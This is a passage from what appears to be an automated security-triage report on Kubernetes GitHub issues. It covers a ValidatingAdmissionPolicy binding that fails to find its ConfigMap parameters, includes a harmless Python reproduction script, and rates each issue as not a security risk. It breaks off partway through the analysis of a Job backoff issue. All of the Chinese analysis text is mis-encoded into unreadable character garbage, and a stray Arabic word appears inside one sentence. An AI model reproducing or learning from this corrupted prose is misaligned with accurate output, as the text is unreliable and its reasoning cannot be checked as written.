ä¸Šè¿° Issue çš„æ ¸å¿ƒæ˜¯ç”¨æˆ·è¯¢é—®å¦‚ä½•åœ¨ Kubernetes StatefulSet ä¸­ä¸ºæ¯ä¸ª Pod æ‰‹åŠ¨æŒ‡å®šä¸€ä¸ªå·²å­˜åœ¨çš„ PVCï¼Œå¹¶æŠ¥å‘Šäº†è‡ªå·±å°è¯•ä½¿ç”¨ `kubectl patch` ä¿®æ”¹è¿è¡Œä¸­ Pod çš„ Volume é…ç½®å¤±è´¥çš„æƒ…å†µã€‚Kubernetes çš„ Pod API è®¾è®¡è§„å®šäº† Pod çš„æŸäº›æ ¸å¿ƒè§„æ ¼ï¼ˆå¦‚æŒ‚è½½çš„ Volume å®šä¹‰ï¼‰åœ¨åˆ›å»ºåæ˜¯ä¸å¯å˜çš„ã€‚ç”¨æˆ·æ”¶åˆ°çš„é”™è¯¯ä¿¡æ¯ `Forbidden: pod updates may not change fields...` å‡†ç¡®åœ°åæ˜ äº†è¿™ä¸€è®¾è®¡çº¦æŸã€‚

å› æ­¤ï¼Œè¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½å’¨è¯¢æˆ–é…ç½®é”™è¯¯ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚å®ƒä¸æ¶‰åŠä»»ä½•æ½œåœ¨çš„æ”»å‡»å‘é‡ã€æƒé™æå‡ã€ä¿¡æ¯æ³„éœ²æˆ–æ‹’ç»æœåŠ¡é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬ 2 æ¡ï¼Œè¯¥ Issue åº”åˆ¤æ–­ä¸º "ä¸æ¶‰åŠ" å®‰å…¨é£é™©ã€‚

ç”±äºé£é™©è¯„çº§ä¸º "ä¸æ¶‰åŠ"ï¼Œå› æ­¤ä¸éœ€è¦æä¾›ç”¨äºå¤ç°å®‰å…¨æ¼æ´çš„ POC è„šæœ¬ã€‚æä¾›çš„ Python ä»£ç ä»…ä½œä¸ºå ä½ç¬¦ï¼Œå¹¶è¯´æ˜äº†ä¸æä¾›å®é™… POC çš„åŸå› ã€‚

---


## Issue #130887 Validating Admission Policy with configmap parameter not working

- Issue é“¾æ¥ï¼š[#130887](https://github.com/kubernetes/kubernetes/issues/130887)

### Issue å†…å®¹

#### What happened?

I'm testing VAP in my local cluster(currently using Virtualbox with Vagrant).  
I tried to use `paramKind` in VAP and `paramRef` in VAPB, as document said that configMap or any resources can be used in those fields, I used configmap.  
Creating VAP was good, but when I tried to check the policy works well, server returned error with this message.  
```
ValidatingAdmissionPolicy 'deny-hostpath-policy' with binding 'default-deny-hostpath' denied request: failed to configure binding: no params found for policy binding with `Deny` parameterNotFoundAction
```

#### What did you expect to happen?

I hoped the server returns deny because of the validations rules. 

#### How can we reproduce it (as minimally and precisely as possible)?

```
apiVersion: v1
kind: ConfigMap
metadata:
  name: "test"
  namespace: "default"
data:
  subjects: "sam"
  secret_role_prefix: "secret"
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: "deny-secret-policy"
spec:
  failurePolicy: Fail
  paramKind:
    apiVersion: v1
    kind: ConfigMap
  matchConstraints:
    resourceRules:
    - apiGroups:   ["rbac.authorization.k8s.io"]
      apiVersions: ["v1"]
      operations:  ["CREATE", "UPDATE"]
      resources:   ["roles", "rolebindings"]
  validations:
    - expression: "params != null"
      message: "params missing but required to bind to this policy"
      messageExpression: "string(params.data.subjects)"
    - expression: "false"
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: "default-deny-secret"
spec:
  paramRef:
    name: "test"
    namespace: "default"
    parameterNotFoundAction: Deny
  policyName: "deny-secret-policy"
  validationActions: [Deny]
  matchResources:
    namespaceSelector:
      matchLabels:
        kubernetes.io/metadata.name: default
```  
  
ConfigMap, ValidatingAdmissionPolicy, ValidatingAdmissionPolicyBinding manifests used for test.    
```
# use user sam
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: sam-secret
  namespace: default
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "watch", "list", "create", "delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: sam-secret
  namespace: default
subjects:
- kind: User
  name: sam
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: sam-secret
  apiGroup: rbac.authorization.k8s.io
```  

Role, RoleBinding manifests for checking validating policy.  

![Image](https://github.com/user-attachments/assets/f8508e99-8d2b-4b6f-b9bf-2190633fbf29)




#### Anything else we need to know?

What I tried:  
- Made the ConfigMap first, and after it created, then made VAP, VAPB --> not worked.  
- Changed matchConditions. i.e) not about rbac, such as pods

Extra FeatureGates:
- CSIVolumeHealth=true
- RecursiveReadOnlyMounts=true


#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here  
Client Version: v1.32.2
Kustomize Version: v5.5.0
Server Version: v1.32.2
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here  
PRETTY_NAME="Ubuntu 24.04 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
...
$ uname -a
# paste output here
Linux master1 6.8.0-31-generic #31-Ubuntu SMP PREEMPT_DYNAMIC Sat Apr 20 00:40:06 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
kubeadm version: &version.Info{Major:"1", Minor:"32", GitVersion:"v1.32.2", GitCommit:"67a30c0adcf52bd3f56ff0893ce19966be12991f", GitTreeState:"clean", BuildDate:"2025-02-12T21:24:52Z", GoVersion:"go1.23.6", Compiler:"gc", Platform:"linux/amd64"}
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd github.com/containerd/containerd/v2 v2.0.3 
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
For installing CNI : https://raw.githubusercontent.com/projectcalico/calico/v3.29.2/manifests/calico.yaml
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **Issueæ ¸å¿ƒé—®é¢˜**ï¼šç”¨æˆ·å°è¯•ä½¿ç”¨ Kubernetes çš„ Validating Admission Policy (VAP) åŠŸèƒ½ï¼Œå¹¶é…ç½®å…¶å‚æ•° (`params`) ä»ä¸€ä¸ª ConfigMap ä¸­è·å–ã€‚ç„¶è€Œï¼Œåœ¨å°è¯•åˆ›å»ºä¸€ä¸ªæœ¬åº”è¢«è¯¥ç­–ç•¥æ‹’ç»çš„èµ„æºï¼ˆRole/RoleBindingï¼‰æ—¶ï¼ŒAPI Server è¿”å›äº†ä¸€ä¸ªé”™è¯¯ `"failed to configure binding: no params found for policy binding with Deny parameterNotFoundAction"`ã€‚è¿™è¡¨æ˜ VAP ç³»ç»Ÿæœªèƒ½æˆåŠŸåŠ è½½æˆ–è¯†åˆ« ConfigMap ä¸­å®šä¹‰çš„å‚æ•°ï¼Œè€Œä¸æ˜¯æ ¹æ® VAP ä¸­å®šä¹‰çš„ `validations` è§„åˆ™ï¼ˆå…¶ä¸­åŒ…å« `expression: "false"`ï¼Œæœ¬åº”å¯¼è‡´æ‹’ç»ï¼‰è¿›è¡Œè¯„ä¼°ã€‚
2.  **é”™è¯¯æ¥æºåˆ†æ**ï¼šé”™è¯¯ä¿¡æ¯ `"no params found..."` ç›´æ¥è¯´æ˜äº†é—®é¢˜æ‰€åœ¨ï¼šVAP Binding é…ç½®äº† `parameterNotFoundAction: Deny`ï¼Œå¹¶ä¸”åœ¨å¤„ç†è¯·æ±‚æ—¶æœªèƒ½æ‰¾åˆ° `paramRef` æŒ‡å‘çš„ ConfigMap (`test` in `default` namespace)ã€‚å°½ç®¡ç”¨æˆ·ç¡®è®¤ ConfigMap æ˜¯å­˜åœ¨çš„ï¼Œä½† VAP æ§åˆ¶å™¨æœªèƒ½è®¿é—®æˆ–å¤„ç†å®ƒä½œä¸ºå‚æ•°æºã€‚è¿™æ›´åƒæ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ Bug æˆ–é…ç½®äº¤äº’é—®é¢˜ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ç³»ç»ŸæŒ‰ç…§ `parameterNotFoundAction: Deny` çš„æŒ‡ç¤º Ø¹Ù…Ù„Øªï¼Œæ‹’ç»äº†è¯·æ±‚ï¼Œä½†è¿™å‘ç”Ÿåœ¨å‚æ•°æŸ¥æ‰¾é˜¶æ®µï¼Œè€Œä¸æ˜¯ç­–ç•¥è§„åˆ™è¯„ä¼°é˜¶æ®µã€‚
3.  **å®‰å…¨é£é™©è¯„ä¼°**ï¼š
    *   è¯¥é—®é¢˜æè¿°çš„æ˜¯ VAP åŠŸèƒ½æœªèƒ½æŒ‰é¢„æœŸå·¥ä½œï¼Œæ— æ³•å°† ConfigMap ä½œä¸ºå‚æ•°æºæˆåŠŸæ³¨å…¥ CEL è¡¨è¾¾å¼è¿›è¡Œè¯„ä¼°ã€‚
    *   ç³»ç»Ÿè¡Œä¸ºæ˜¯æ‹’ç»è¯·æ±‚ï¼Œè¿™æ˜¯å› ä¸º `parameterNotFoundAction: Deny` é…ç½®ç”Ÿæ•ˆï¼Œé˜»æ­¢äº†å› å‚æ•°ç¼ºå¤±å¯èƒ½å¯¼è‡´çš„ç­–ç•¥ç»•è¿‡ã€‚è¿™æœ¬èº«æ˜¯ä¸€ç§å®‰å…¨ä¿æŠ¤æœºåˆ¶ï¼Œé˜²æ­¢åœ¨å‚æ•°ä¸å¯ç”¨æ—¶é”™è¯¯åœ°å…è®¸è¯·æ±‚ã€‚
    *   æ²¡æœ‰è¿¹è±¡è¡¨æ˜æ­¤é—®é¢˜å¯è¢«åˆ©ç”¨äºç»•è¿‡å®‰å…¨ç­–ç•¥ã€æ‰§è¡Œæœªæˆæƒæ“ä½œã€æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æˆ–æå‡æƒé™ã€‚ç”¨æˆ·é‡åˆ°çš„é—®é¢˜æ˜¯ç­–ç•¥ *æœªèƒ½æŒ‰é¢„æœŸæ–¹å¼æ‹’ç»*ï¼ˆå³åŸºäº `validation` è§„åˆ™ï¼‰ï¼Œè€Œæ˜¯å› ä¸º *é…ç½®é”™è¯¯æˆ–å‚æ•°æŸ¥æ‰¾å¤±è´¥* è€Œæ‹’ç»ã€‚
    *   æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡† 2ï¼Œè¯¥ issue æè¿°çš„é—®é¢˜éå®‰å…¨é—®é¢˜ï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§é—®é¢˜ã€‚
    *   æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡† 4ï¼Œè¿™ä¸æ˜¯ issue æäº¤è€…è‡ªèº«çš„é—®é¢˜ï¼Œè€Œæ˜¯æŠ¥å‘Š Kubernetes ç»„ä»¶å¯èƒ½å­˜åœ¨çš„ Bug æˆ–é…ç½®éš¾é¢˜ã€‚ä½†è¿™å¹¶ä¸æ”¹å˜é—®é¢˜æœ¬èº«çš„æ€§è´¨ï¼ˆéå®‰å…¨é—®é¢˜ï¼‰ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import yaml
import time
import logging
from kubernetes import config, client
from kubernetes.client.exceptions import ApiException

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define manifests from the issue
CONFIGMAP_YAML = """
apiVersion: v1
kind: ConfigMap
metadata:
  name: "test"
  namespace: "default"
data:
  subjects: "sam"
  secret_role_prefix: "secret"
"""

VAP_YAML = """
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: "deny-secret-policy"
spec:
  failurePolicy: Fail
  paramKind:
    apiVersion: v1
    kind: ConfigMap
  matchConstraints:
    resourceRules:
    - apiGroups:   ["rbac.authorization.k8s.io"]
      apiVersions: ["v1"]
      operations:  ["CREATE", "UPDATE"]
      resources:   ["roles", "rolebindings"]
  validations:
    - expression: "params != null"
      message: "params missing but required to bind to this policy"
      messageExpression: "string(params.data.subjects)"
    - expression: "false"
      message: "This rule should always deny if params are found"
"""

VAPB_YAML = """
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: "default-deny-secret"
spec:
  paramRef:
    name: "test"
    namespace: "default"
    parameterNotFoundAction: Deny
  policyName: "deny-secret-policy"
  validationActions: [Deny]
  matchResources:
    namespaceSelector:
      matchLabels:
        kubernetes.io/metadata.name: default
"""

ROLE_YAML = """
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: sam-secret-test-role
  namespace: default
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "watch", "list", "create", "delete"]
"""

def apply_manifest(api_client, manifest_yaml):
    """Applies a Kubernetes manifest YAML."""
    manifest = yaml.safe_load(manifest_yaml)
    kind = manifest.get("kind")
    api_version = manifest.get("apiVersion")
    namespace = manifest.get("metadata", {}).get("namespace", "default") # Default to 'default' if not specified
    name = manifest.get("metadata", {}).get("name")

    try:
        if api_version == "v1" and kind == "ConfigMap":
            api = client.CoreV1Api(api_client)
            api.create_namespaced_config_map(body=manifest, namespace=namespace)
            logging.info(f"ConfigMap '{name}' created in namespace '{namespace}'.")
        elif api_version == "admissionregistration.k8s.io/v1" and kind == "ValidatingAdmissionPolicy":
            api = client.AdmissionregistrationV1Api(api_client)
            api.create_validating_admission_policy(body=manifest)
            logging.info(f"ValidatingAdmissionPolicy '{name}' created.")
            # Add a small delay to allow the policy to potentially settle
            time.sleep(2)
        elif api_version == "admissionregistration.k8s.io/v1" and kind == "ValidatingAdmissionPolicyBinding":
            api = client.AdmissionregistrationV1Api(api_client)
            api.create_validating_admission_policy_binding(body=manifest)
            logging.info(f"ValidatingAdmissionPolicyBinding '{name}' created.")
            # Add a delay after binding creation for the system to sync
            time.sleep(5)
        elif api_version == "rbac.authorization.k8s.io/v1" and kind == "Role":
            api = client.RbacAuthorizationV1Api(api_client)
            api.create_namespaced_role(body=manifest, namespace=namespace)
            logging.info(f"Role '{name}' created in namespace '{namespace}'.")
        else:
            logging.warning(f"Unsupported resource kind/apiVersion: {kind}/{api_version}")
            return False
        return True
    except ApiException as e:
        # If resource already exists, consider it success for setup phases
        if e.status == 409: # Conflict (Already Exists)
             if kind not in ["Role"]: # Don't ignore conflict for the test Role
                logging.warning(f"{kind} '{name}' already exists. Skipping creation.")
                return True
             else:
                logging.error(f"Error creating Role '{name}': {e.reason} (Status: {e.status})")
                logging.debug(f"Error details: {e.body}")
                raise e # Re-raise for the test Role
        else:
            logging.error(f"Error creating {kind} '{name}': {e.reason} (Status: {e.status})")
            logging.debug(f"Error details: {e.body}")
            # For VAP/VAPB, allow some time for the webhook configuration to propagate if it fails initially
            if kind in ["ValidatingAdmissionPolicy", "ValidatingAdmissionPolicyBinding"]:
                 logging.warning("Waiting briefly after failed VAP/VAPB creation...")
                 time.sleep(5)
            raise e # Re-raise exception for other errors or the Role

def delete_manifest(api_client, manifest_yaml):
    """Deletes a Kubernetes resource defined by a manifest YAML."""
    manifest = yaml.safe_load(manifest_yaml)
    kind = manifest.get("kind")
    api_version = manifest.get("apiVersion")
    namespace = manifest.get("metadata", {}).get("namespace", "default")
    name = manifest.get("metadata", {}).get("name")

    try:
        if api_version == "v1" and kind == "ConfigMap":
            api = client.CoreV1Api(api_client)
            api.delete_namespaced_config_map(name=name, namespace=namespace)
            logging.info(f"ConfigMap '{name}' deleted from namespace '{namespace}'.")
        elif api_version == "admissionregistration.k8s.io/v1" and kind == "ValidatingAdmissionPolicy":
            api = client.AdmissionregistrationV1Api(api_client)
            api.delete_validating_admission_policy(name=name)
            logging.info(f"ValidatingAdmissionPolicy '{name}' deleted.")
        elif api_version == "admissionregistration.k8s.io/v1" and kind == "ValidatingAdmissionPolicyBinding":
            api = client.AdmissionregistrationV1Api(api_client)
            api.delete_validating_admission_policy_binding(name=name)
            logging.info(f"ValidatingAdmissionPolicyBinding '{name}' deleted.")
        elif api_version == "rbac.authorization.k8s.io/v1" and kind == "Role":
            api = client.RbacAuthorizationV1Api(api_client)
            api.delete_namespaced_role(name=name, namespace=namespace)
            logging.info(f"Role '{name}' deleted from namespace '{namespace}'.")
        else:
            logging.warning(f"Skipping deletion for unsupported resource kind/apiVersion: {kind}/{api_version}")
    except ApiException as e:
        if e.status == 404: # Not Found
            logging.warning(f"{kind} '{name}' not found. Skipping deletion.")
        else:
            logging.error(f"Error deleting {kind} '{name}': {e.reason} (Status: {e.status})")
            logging.debug(f"Error details: {e.body}")
            # Don't re-raise during cleanup to ensure other deletions attempt

def main():
    """Main function to reproduce the issue."""
    try:
        # Load Kubernetes configuration from default location (~/.kube/config)
        config.load_kube_config()
        api_client = client.ApiClient()
    except Exception as e:
        logging.error(f"Failed to load Kubernetes configuration: {e}")
        return

    resources_to_cleanup = [ROLE_YAML, VAPB_YAML, VAP_YAML, CONFIGMAP_YAML]

    try:
        logging.info("Starting reproduction steps...")

        # 1. Create ConfigMap
        if not apply_manifest(api_client, CONFIGMAP_YAML): return

        # 2. Create ValidatingAdmissionPolicy
        if not apply_manifest(api_client, VAP_YAML): return

        # 3. Create ValidatingAdmissionPolicyBinding
        if not apply_manifest(api_client, VAPB_YAML): return

        logging.info("Setup complete. Attempting to create the Role which should trigger the policy...")
        time.sleep(2) # Short delay before test

        # 4. Attempt to create the Role (this is expected to fail)
        try:
            apply_manifest(api_client, ROLE_YAML)
            logging.error("Role creation unexpectedly succeeded. The reported issue was not reproduced.")
            # If it succeeded, something is different, or the issue is fixed/intermittent
        except ApiException as e:
            if e.status == 400 or e.status == 403: # Bad Request or Forbidden usually indicate admission controller denial
                expected_error_fragment = "failed to configure binding: no params found"
                if expected_error_fragment in str(e.body):
                    logging.info(f"Successfully reproduced the issue. Role creation failed with expected error fragment: '{expected_error_fragment}'")
                    logging.info(f"Full error message: {e.reason} - Body: {e.body}")
                else:
                    logging.warning(f"Role creation failed, but the error message did not contain the expected fragment '{expected_error_fragment}'.")
                    logging.warning(f"Actual error: Status={e.status}, Reason={e.reason}, Body={e.body}")
            else:
                logging.error(f"Role creation failed with an unexpected error status code {e.status}: {e.reason}")
                logging.debug(f"Error details: {e.body}")

    except Exception as e:
        logging.error(f"An unexpected error occurred during the process: {e}")
    finally:
        logging.info("Starting cleanup...")
        # Use a reversed list for cleanup to respect dependencies roughly
        for manifest_yaml in resources_to_cleanup:
             # Add a small delay between deletions
            time.sleep(1)
            delete_manifest(api_client, manifest_yaml)
        logging.info("Cleanup finished.")

# Execute main function directly
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1.  **ç›®çš„**ï¼šè¯¥è„šæœ¬æ—¨åœ¨é€šè¿‡ç¼–ç¨‹æ–¹å¼å¤ç° GitHub Issue ä¸­æè¿°çš„åœºæ™¯ï¼Œå³åˆ›å»ºä¸€ä¸ª Validating Admission Policy (VAP) å’Œ Bindingï¼Œè¯¥ Binding å¼•ç”¨ä¸€ä¸ª ConfigMap ä½œä¸ºå‚æ•°æºï¼Œç„¶åå°è¯•åˆ›å»ºä¸€ä¸ª Role èµ„æºï¼Œé¢„æœŸè¯¥åˆ›å»ºæ“ä½œä¼šå› ä¸º VAP æ— æ³•æ‰¾åˆ°å‚æ•°è€Œè¢«æ‹’ç»ã€‚
2.  **åº“ä¾èµ–**ï¼šè„šæœ¬ä½¿ç”¨ `kubernetes` Python å®¢æˆ·ç«¯åº“ä¸ Kubernetes API è¿›è¡Œäº¤äº’ï¼Œå¹¶ä½¿ç”¨ `yaml` åº“è§£æ Manifestã€‚
3.  **é…ç½®åŠ è½½**ï¼š`config.load_kube_config()` ä¼šå°è¯•ä»é»˜è®¤è·¯å¾„ (`~/.kube/config`) åŠ è½½ Kubernetes é›†ç¾¤çš„è¿æ¥é…ç½®ã€‚
4.  **èµ„æºå®šä¹‰**ï¼šIssue ä¸­æä¾›çš„ ConfigMap, ValidatingAdmissionPolicy, ValidatingAdmissionPolicyBinding, å’Œ Role çš„ YAML Manifest è¢«å®šä¹‰ä¸º Python å¤šè¡Œå­—ç¬¦ä¸²ã€‚
5.  **èµ„æºåˆ›å»º (`apply_manifest`)**ï¼š
    *   è¯¥å‡½æ•°æ¥æ”¶ API å®¢æˆ·ç«¯å’Œ YAML å­—ç¬¦ä¸²ï¼Œè§£æ YAML è·å– `kind`, `apiVersion`, `name`, `namespace`ã€‚
    *   æ ¹æ® `kind` å’Œ `apiVersion` è°ƒç”¨ç›¸åº”çš„ `kubernetes` å®¢æˆ·ç«¯ API æ–¹æ³•æ¥åˆ›å»ºèµ„æºï¼ˆå¦‚ `create_namespaced_config_map`, `create_validating_admission_policy` ç­‰ï¼‰ã€‚
    *   æ·»åŠ äº†æ—¥å¿—è®°å½•ï¼Œå¹¶åœ¨åˆ›å»º VAP å’Œ VAPB ååŠ å…¥äº†çŸ­æš‚çš„ `time.sleep()`ï¼Œå› ä¸º Admission Webhook/Policy é…ç½®çš„ç”Ÿæ•ˆå¯èƒ½éœ€è¦ä¸€ç‚¹æ—¶é—´åœ¨é›†ç¾¤ä¸­ä¼ æ’­ã€‚
    *   åŒ…å«åŸºæœ¬çš„é”™è¯¯å¤„ç†ï¼Œç‰¹åˆ«æ˜¯å¤„ç†èµ„æºå·²å­˜åœ¨ï¼ˆ409 Conflictï¼‰çš„æƒ…å†µï¼Œå…è®¸è„šæœ¬åœ¨èµ„æºå·²å­˜åœ¨æ—¶ç»§ç»­ï¼ˆé™¤äº†æµ‹è¯•ç›®æ ‡ Roleï¼‰ã€‚
6.  **å¤ç°å°è¯•**ï¼š
    *   è„šæœ¬æŒ‰é¡ºåºåˆ›å»º ConfigMapã€VAP å’Œ VAPBã€‚
    *   ç„¶åï¼Œå®ƒå°è¯•åˆ›å»º `sam-secret-test-role` è¿™ä¸ª Role èµ„æºã€‚
    *   **å…³é”®éªŒè¯**ï¼šè„šæœ¬å°† Role åˆ›å»ºæ“ä½œæ”¾åœ¨ `try...except ApiException` å—ä¸­ã€‚æ ¹æ® Issue æŠ¥å‘Šï¼Œé¢„æœŸæ­¤æ“ä½œä¼šå¤±è´¥ï¼Œå¹¶æŠ›å‡º `ApiException`ã€‚è„šæœ¬æ£€æŸ¥æ•è·çš„å¼‚å¸¸ï¼š
        *   çŠ¶æ€ç æ˜¯å¦ä¸º 400 (Bad Request) æˆ– 403 (Forbidden)ï¼Œè¿™é€šå¸¸æ˜¯ Admission Controller æ‹’ç»è¯·æ±‚æ—¶è¿”å›çš„çŠ¶æ€ã€‚
        *   å¼‚å¸¸çš„ `body`ï¼ˆåŒ…å« API Server è¿”å›çš„è¯¦ç»†é”™è¯¯ä¿¡æ¯ï¼‰ä¸­æ˜¯å¦åŒ…å«å…³é”®é”™è¯¯ç‰‡æ®µ `"failed to configure binding: no params found"`ã€‚
    *   å¦‚æœå¼‚å¸¸è¢«æ•è·ä¸”åŒ…å«é¢„æœŸçš„é”™è¯¯ä¿¡æ¯ï¼Œè„šæœ¬ä¼šæ‰“å°æˆåŠŸå¤ç°é—®é¢˜çš„æ—¥å¿—ã€‚
    *   å¦‚æœ Role åˆ›å»ºæˆåŠŸï¼Œæˆ–è€…å¤±è´¥ä½†é”™è¯¯ä¿¡æ¯ä¸åŒï¼Œè„šæœ¬ä¼šæ‰“å°ç›¸åº”çš„é”™è¯¯æˆ–è­¦å‘Šæ—¥å¿—ã€‚
7.  **èµ„æºæ¸…ç† (`delete_manifest`)**ï¼š
    *   `finally` å—ç¡®ä¿æ— è®ºè„šæœ¬æ‰§è¡ŒæˆåŠŸä¸å¦ï¼Œéƒ½ä¼šå°è¯•åˆ é™¤ä¹‹å‰åˆ›å»ºçš„æ‰€æœ‰ Kubernetes èµ„æºï¼Œä»¥ä¿æŒç¯å¢ƒæ•´æ´ã€‚
    *   æ¸…ç†æ—¶ä¼šå¿½ç•¥ 404 (Not Found) é”™è¯¯ï¼Œä»¥é˜²èµ„æºå·²è¢«æ‰‹åŠ¨åˆ é™¤æˆ–ä»æœªæˆåŠŸåˆ›å»ºã€‚
    *   æŒ‰ç…§ä¸åˆ›å»ºå¤§è‡´ç›¸åçš„é¡ºåºåˆ—å‡ºå¾…æ¸…ç†èµ„æº (`resources_to_cleanup`)ï¼Œæœ‰åŠ©äºå¤„ç†ä¾èµ–å…³ç³»ï¼ˆè™½ç„¶åœ¨è¿™ä¸ªç®€å•åœºæ™¯ä¸­ä¸ä¸¥æ ¼ï¼‰ã€‚
8.  **æ‰§è¡Œ**ï¼šè„šæœ¬ç›´æ¥è°ƒç”¨ `main()` å‡½æ•°å¼€å§‹æ‰§è¡Œã€‚

**æ€»ç»“**ï¼šè¿™ä¸ª Python è„šæœ¬æ¨¡æ‹Ÿäº†ç”¨æˆ·åœ¨ Issue ä¸­æŠ¥å‘Šçš„æ‰‹åŠ¨æ­¥éª¤ï¼Œä½¿ç”¨ Kubernetes API åˆ›å»ºç›¸å…³èµ„æºï¼Œå¹¶éªŒè¯åœ¨å°è¯•åˆ›å»ºç›®æ ‡ Role æ—¶æ˜¯å¦æ”¶åˆ°äº†ä¸ Issue ä¸­æè¿°çš„å®Œå…¨ç›¸åŒçš„ã€æŒ‡ç¤ºå‚æ•°æŸ¥æ‰¾å¤±è´¥çš„é”™è¯¯ä¿¡æ¯ã€‚å®ƒæ—¨åœ¨è¯æ˜è¯¥åŠŸèƒ½æ€§é—®é¢˜æ˜¯å¯å¤ç°çš„ï¼Œè€Œä¸æ˜¯æ¼”ç¤ºä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚

---


## Issue #130881 Job backoff delay increases despite ignore action in pod failure policy

- Issue é“¾æ¥ï¼š[#130881](https://github.com/kubernetes/kubernetes/issues/130881)

### Issue å†…å®¹

#### What happened?

With the following pod failure policy:
```yaml
  podFailurePolicy:
    rules:
      - action: Ignore
        onPodConditions:
        - type: DisruptionTarget
```
When evicting a pod, such pod won't be counted towards the backoff limit, which is expected, but backoff delay will be increased, so a new pod will be created according to the exponential backoff rules. If we drain a node with 3 job pods running on it, they will get terminated, and then new pods will be created after 40 seconds.

#### What did you expect to happen?

Configured `podFailurePolicy` suggests that pod disruption won't be treated as a job failure, so besides not counting it towards the backoff limit, pod disruption also shouldn't increase the backoff delay. In the above example, new pods should be recreated on other nodes right away.

If this is WAI, is there an option to bypass the backoff in case of an expected pod disruption?

#### How can we reproduce it (as minimally and precisely as possible)?

Example job:
```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: test-job
spec:
  parallelism: 10
  completions: 10
  podFailurePolicy:
    rules:
      - action: Ignore
        onPodConditions:
        - type: DisruptionTarget
  template:
    spec:
      containers:
      - name: pause
        image: gcr.io/google_containers/pause
        resources:
          requests:
            cpu: 500m
      restartPolicy: Never
  backoffLimit: 4
```

Apply this job, wait for pods to be running. Evict some pods, either via kubectl drain or the eviction API. Pods should get recreated after the backoff delay.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.6-dispatcher
Kustomize Version: v5.4.2
Server Version: v1.31.5-gke.1023000
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ª Kubernetes Job æ§åˆ¶å™¨åœ¨ä½¿ç”¨ `podFailurePolicy` æ—¶é‡åˆ°çš„è¡Œä¸ºé—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œå½“ `podFailurePolicy` è®¾ç½®ä¸ºå¯¹ `DisruptionTarget` ç±»å‹çš„ Pod æ¡ä»¶æ‰§è¡Œ `Ignore` æ“ä½œæ—¶ï¼Œè™½ç„¶è¢«é©±é€ï¼ˆevictedï¼‰çš„ Pod ä¸è®¡å…¥ `backoffLimit`ï¼ˆå¤±è´¥æ¬¡æ•°é™åˆ¶ï¼‰ï¼Œä½† Job æ§åˆ¶å™¨ä»ç„¶ä¼šå¢åŠ ä¸‹ä¸€æ¬¡ Pod åˆ›å»ºçš„é€€é¿å»¶è¿Ÿï¼ˆbackoff delayï¼‰ã€‚ç”¨æˆ·æœŸæœ› `Ignore` æ“ä½œä¸ä»…å¿½ç•¥å¤±è´¥è®¡æ•°ï¼Œä¹Ÿåº”è¯¥å¿½ç•¥é€€é¿å»¶è¿Ÿçš„å¢åŠ ï¼Œä½¿å¾—å› èŠ‚ç‚¹ç»´æŠ¤ç­‰é¢„æœŸä¸­æ–­è€Œè¢«é©±é€çš„ Pod èƒ½å¤Ÿç«‹å³åœ¨å…¶ä»–èŠ‚ç‚¹ä¸Šé‡æ–°åˆ›å»ºã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼š
